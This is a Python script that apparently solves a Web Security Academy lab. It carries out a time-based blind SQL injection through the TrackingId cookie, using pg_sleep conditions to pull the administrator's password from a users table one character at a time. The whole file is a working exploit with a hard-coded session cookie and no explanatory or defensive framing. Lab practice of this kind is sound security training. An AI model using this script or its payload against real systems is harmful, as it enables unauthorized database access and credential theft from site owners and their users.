import requests
import string

char=string.ascii_lowercase+string.digits
password=''
url = "https://0ae20010043f493881a96ba20030005c.web-security-academy.net"

cookies={"TrackingId":"TitRnN6kB3eA4vgG'||(SELECT CASE WHEN LENGTH(password)>20 THEN pg_sleep(1) ELSE '' END FROM users )||'","session":"tpEMGvfdGQ8YpNZyO2sEqKLyczeGrovl"}

# r=requests.get(url,cookies=cookies)

# print(r.elapsed.total_seconds())


for i in range(1,21):
    for x in char:
        cookies={"TrackingId":f"TitRnN6kB3eA4vgG'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{x}' THEN pg_sleep(1) ELSE '' END FROM users WHERE username='administrator' )||'","session":"tpEMGvfdGQ8YpNZyO2sEqKLyczeGrovl"}
        r=requests.get(url,cookies=cookies)
        if r.elapsed.total_seconds()>1:
            password+=x
            print("[+] Password: "+password)

            break
